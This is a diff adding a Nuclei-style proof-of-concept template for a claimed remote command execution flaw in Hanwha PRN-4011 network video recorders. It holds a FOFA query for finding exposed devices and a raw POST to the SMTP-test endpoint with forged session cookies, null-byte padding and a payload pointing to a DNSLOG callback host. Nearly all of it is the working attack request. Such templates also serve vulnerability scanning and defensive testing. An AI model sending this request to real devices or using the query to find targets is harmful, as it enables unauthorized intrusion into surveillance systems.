@@ -1,0 +1,38 @@
+id: poc-xtug5hmiwyft3gsn
+info:
+  name: Hanwha-PRN-4011 network-mail-smtp-test 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xtug5hmiwyft3gsn'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xtug5hmiwyft3gsn
+    fofa: body="$.nvr.model_name=" && body="prn-4011"
+http:
+- raw:
+  - 'POST /index.php/network/network_mail_smtp_test HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Length: 290
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: DATA2=+7s9nS0/8whIc/IYm4Sg2A==; POE_SWITCH_STATUS=1; cs_id=1775619189; ss_id=1012484%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00; DEVICE_PORT=4520; DATA1=YWRtaW4=; QUICK_SETUP_REC_CHECK=0; CRASH_ERROR_CHECK=0; LOGIN_CLIENT=0; installCamReg=true; is_login_ok=y; DATA5=QWRtaW4yNDEyNjg=; nvr_lang=0; time_format=0; date_format=0; is_multi_pw_login_ok=0; single_keep_aspect_ratio=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0; live_channels_rotate_screen_idx=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0; live_channels_cam_position_idx=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0; live_channels_dewarp_type_idx=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0; setup1=1; user_layout_index=undefined
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36
+
+
+    smtp={"COMMAND":"2416","user_cnt":"1","sender_email":"localhost@test.net","url":"DNSLOG.COM","port":"25","user":"","use_auth":0,"security":"0","tcp_port":"4520","webviewer_port":"8081","retun_test_value":5,"passwd":""}&client_session=987099789'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
